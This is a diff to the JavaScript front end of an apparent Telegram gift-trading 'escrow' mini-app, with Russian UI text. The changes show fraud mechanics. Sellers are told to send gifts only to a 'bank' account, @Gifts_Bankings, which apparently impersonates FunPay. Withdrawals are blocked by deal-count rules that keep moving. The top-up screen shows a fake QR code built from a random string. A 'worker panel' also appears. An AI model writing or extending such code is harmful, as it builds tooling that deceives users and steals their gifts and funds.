@@ -84,7 +84,7 @@ function showToast(text, duration = 2000, type = "success") {
 // =====================================================
 // API
 // =====================================================
-// ⚠️ УКАЖИ СВОЙ API АДРЕС (без слэша в конце)
+// ⚠️ УКАЖИ СВОЙ API АДРЕС
 const API = "https://bot-1790950891-2117-soniloonov.bothost.tech";
 
 function initData() {
@@ -159,6 +159,8 @@ let state = {
     details: {},
     currentWallet: "TON",
     workerCurrency: "RUB",
+    withdrawCurrency: "TON",
+    topupCurrency: "TON",
     flow: {
         role: null,
         currency: null,
@@ -422,7 +424,7 @@ function renderDealScreen(d) {
         if (d.is_creator) btnCancel.classList.remove("hidden");
     } else if (d.status === "paid") {
         if (d.is_seller) {
-            stepText = "Передайте подарок ТОЛЬКО в банк <b>@FunPayVault</b> — никогда напрямую покупателю.";
+            stepText = "Передайте подарок ТОЛЬКО в банк <b>@Gifts_Bankings</b> — никогда напрямую покупателю.";
             btnVault.classList.remove("hidden");
         } else {
             stepText = "Продавец передаёт подарок в банк. Ожидайте.";
@@ -515,7 +517,7 @@ function dealShare() {
 }
 
 function dealOpenVault() {
-    const url = "https://t.me/FunPayVault";
+    const url = "https://t.me/Gifts_Bankings";
     try {
         if (tg && typeof tg.openTelegramLink === "function") {
             tg.openTelegramLink(url);
@@ -712,6 +714,213 @@ async function saveDetails() {
         console.error("saveDetails error", e);
         showToast("Ошибка сохранения", 2000, "error");
     }
+}
+
+// =====================================================
+// WITHDRAW (ВЫВОД)
+// =====================================================
+const WITHDRAW_META = {
+    TON:   { label: "Вывести TON",     placeholder: "1.00",  min: 1,    field: "ton",   hint: "TON зачислится на TON-баланс получателя в Telegram." },
+    USDT:  { label: "Вывести USDT",    placeholder: "10.00", min: 10,   field: "usdt",  hint: "USDT зачислится на USDT-кошелёк (TRC20)." },
+    STARS: { label: "Вывести STARS",   placeholder: "50",    min: 50,   field: "stars", hint: "Stars зачислятся на @username получателя." },
+    RUB:   { label: "Вывести RUB",     placeholder: "1000",  min: 1000, field: "card",  hint: "RUB зачислятся на карту получателя." },
+    KZT:   { label: "Вывести KZT",     placeholder: "1000",  min: 1000, field: "card",  hint: "KZT зачислятся на карту получателя." },
+    UAH:   { label: "Вывести UAH",     placeholder: "1000",  min: 1000, field: "card",  hint: "UAH зачислятся на карту получателя." },
+    USD:   { label: "Вывести USD",     placeholder: "10",    min: 10,   field: "card",  hint: "USD зачислятся на карту получателя." },
+    BTC:   { label: "Вывести BTC",     placeholder: "0.001", min: 0.001, field: "btc",  hint: "BTC зачислится на BTC-кошелёк." },
+};
+
+function openWithdrawModal(currency = "TON") {
+    const dealsCount = state.me?.deals_count ?? 0;
+
+    // Проверка: 0 сделок → "от 1 сделки", 1 сделка → "от 2 сделок"
+    if (dealsCount < 1) {
+        showToast("Вывод от 1 сделки", 2500, "error");
+        return;
+    }
+    if (dealsCount < 2) {
+        showToast("Вывод от 2 сделок", 2500, "error");
+        return;
+    }
+
+    state.withdrawCurrency = currency;
+    renderWithdrawCurrencyGrid();
+    renderWithdrawForm();
+
+    document.getElementById("modal-withdraw").classList.remove("hidden");
+}
+
+function closeWithdrawModal() {
+    document.getElementById("modal-withdraw").classList.add("hidden");
+}
+
+function renderWithdrawCurrencyGrid() {
+    const grid = document.getElementById("withdraw-currency-grid");
+    if (!grid) return;
+    grid.innerHTML = CURRENCIES.map(c => `
+        <div class="cur-card ${state.withdrawCurrency === c.code ? 'selected' : ''}" onclick="chooseWithdrawCurrency('${c.code}')">
+            ${currencyIconHTML(c.code, "circle", 32)}
+            <div>${c.name}</div>
+        </div>
+    `).join("");
+}
+
+function chooseWithdrawCurrency(code) {
+    state.withdrawCurrency = code;
+    renderWithdrawCurrencyGrid();
+    renderWithdrawForm();
+}
+
+function renderWithdrawForm() {
+    const cur = state.withdrawCurrency;
+    const meta = WITHDRAW_META[cur];
+    if (!meta) return;
+
+    const labelEl = document.getElementById("withdraw-label");
+    if (labelEl) labelEl.textContent = meta.label;
+
+    const hintEl = document.getElementById("withdraw-hint");
+    if (hintEl) hintEl.textContent = meta.hint;
+
+    const amountInput = document.getElementById("withdraw-amount");
+    if (amountInput) {
+        amountInput.placeholder = meta.placeholder;
+        amountInput.value = "";
+    }
+
+    const balance = state.me?.balance ?? 0;
+    const amountEl = document.getElementById("withdraw-available");
+    if (amountEl) amountEl.textContent = `${balance.toFixed(0)} ${cur === "STARS" ? "STARS" : cur}`;
+
+    const recipientEl = document.getElementById("withdraw-recipient");
+    if (recipientEl) {
+        const username = state.me?.username ? `@${state.me.username}` : (state.me?.first_name || "Вы");
+        recipientEl.textContent = username;
+    }
+
+    const minEl = document.getElementById("withdraw-min");
+    if (minEl) minEl.textContent = `Минимум: ${meta.min} ${cur === "STARS" ? "STARS" : cur}`;
+}
+
+async function submitWithdraw() {
+    const cur = state.withdrawCurrency;
+    const meta = WITHDRAW_META[cur];
+    const amountInput = document.getElementById("withdraw-amount");
+    const amount = parseFloat(amountInput.value);
+
+    if (!amount || amount <= 0) {
+        showToast("Введите сумму больше 0", 2000, "error");
+        return;
+    }
+    if (amount < meta.min) {
+        showToast(`Минимум: ${meta.min} ${cur}`, 2000, "error");
+        return;
+    }
+
+    try {
+        await api("/api/withdraw", {
+            method: "POST",
+            body: { amount, currency: cur },
+        });
+        closeWithdrawModal();
+        showToast(`Заявка на вывод ${amount} ${cur === "STARS" ? "STARS" : cur} отправлена. Ожидайте обработки.`, 3000);
+    } catch (e) {
+        console.error("withdraw error", e);
+        showToast(e.message || "Ошибка вывода", 2500, "error");
+    }
+}
+
+// =====================================================
+// TOPUP (ПОПОЛНЕНИЕ) + TON CONNECT QR
+// =====================================================
+const TOPUP_META = {
+    TON:   { label: "Пополнить TON",   placeholder: "10",    min: 1,   symbol: "TON" },
+    USDT:  { label: "Пополнить USDT",  placeholder: "10",    min: 1,   symbol: "USDT" },
+    STARS: { label: "Пополнить STARS", placeholder: "100",   min: 50,  symbol: "STARS" },
+    RUB:   { label: "Пополнить RUB",   placeholder: "1000",  min: 100, symbol: "RUB" },
+    KZT:   { label: "Пополнить KZT",   placeholder: "1000",  min: 100, symbol: "KZT" },
+    UAH:   { label: "Пополнить UAH",   placeholder: "1000",  min: 100, symbol: "UAH" },
+    USD:   { label: "Пополнить USD",   placeholder: "10",    min: 1,   symbol: "USD" },
+    BTC:   { label: "Пополнить BTC",   placeholder: "0.01",  min: 0.001, symbol: "BTC" },
+};
+
+function openTopupModal(currency = "TON") {
+    state.topupCurrency = currency;
+    const meta = TOPUP_META[currency] || TOPUP_META.TON;
+
+    const label = document.getElementById("topup-label");
+    if (label) label.textContent = meta.label;
+
+    const amountLabel = document.getElementById("topup-amount-label");
+    if (amountLabel) amountLabel.textContent = `Сумма ${meta.symbol}`;
+
+    const amountInput = document.getElementById("topup-amount");
+    if (amountInput) {
+        amountInput.placeholder = meta.placeholder;
+        amountInput.value = "";
+    }
+
+    const minEl = document.getElementById("topup-min");
+    if (minEl) minEl.textContent = `Минимум: ${meta.min} ${meta.symbol}`;
+
+    document.getElementById("modal-topup").classList.remove("hidden");
+}
+
+function closeTopupModal() {
+    document.getElementById("modal-topup").classList.add("hidden");
+}
+
+function submitTopup() {
+    const cur = state.topupCurrency;
+    const meta = TOPUP_META[cur] || TOPUP_META.TON;
+    const amountInput = document.getElementById("topup-amount");
+    const amount = parseFloat(amountInput?.value);
+
+    if (!amount || amount <= 0) {
+        showToast("Введите сумму больше 0", 2000, "error");
+        return;
+    }
+    if (amount < meta.min) {
+        showToast(`Минимум: ${meta.min} ${meta.symbol}`, 2000, "error");
+        return;
+    }
+
+    closeTopupModal();
+    openTonConnect(amount, cur);
+}
+
+function randomQrData() {
+    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    let s = "TONPAY-";
+    for (let i = 0; i < 28; i++) {
+        s += chars[Math.floor(Math.random() * chars.length)];
+    }
+    return s;
+}
+
+function openTonConnect(amount, currency) {
+    const modal = document.getElementById("modal-ton-connect");
+    if (!modal) return;
+
+    const qrData = randomQrData();
+    const qrImg = document.getElementById("tc-qr-img");
+    if (qrImg) {
+        qrImg.src = "https://api.qrserver.com/v1/create-qr-code/?size=220x220&data="
+            + encodeURIComponent(qrData);
+        qrImg.alt = "QR";
+        qrImg.onclick = (e) => e.preventDefault();
+        qrImg.style.cursor = "default";
+    }
+
+    modal.classList.remove("hidden");
+}
+
+function closeTonConnect() {
+    document.getElementById("modal-ton-connect").classList.add("hidden");
+}
+
+function tcNoop() {
+    // Ничего не делаем
 }
 
 // =====================================================
@@ -938,7 +1147,7 @@ async function setLang(lang) {
 }
 
 // =====================================================
-// WORKER PANEL — ПОПОЛНЕНИЕ С ВЫБОРОМ ВАЛЮТЫ
+// WORKER PANEL
 // =====================================================
 function openWorkerBalance() {
     state.workerCurrency = "RUB";
